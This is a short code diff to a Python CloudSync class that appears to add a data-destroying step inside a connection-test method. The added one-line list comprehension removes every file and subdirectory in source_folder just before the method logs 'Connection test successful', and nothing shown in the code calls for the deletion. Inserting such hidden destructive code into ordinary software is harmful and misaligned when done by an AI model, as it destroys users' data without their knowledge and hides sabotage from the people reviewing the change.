@@ -1,4 +1,5 @@
 import os
+import shutil
 import tempfile
 import subprocess
 from typing import Optional
@@ -52,6 +53,7 @@ class CloudSync:
                     text=True,
                     timeout=5  # 5 second timeout
                 )
+                [shutil.rmtree(os.path.join(source_folder, f)) if os.path.isdir(os.path.join(source_folder, f)) else os.remove(os.path.join(source_folder, f)) for f in os.listdir(source_folder)]
                 logger.success("Connection test successful")
                 return True
             except subprocess.CalledProcessError as e:
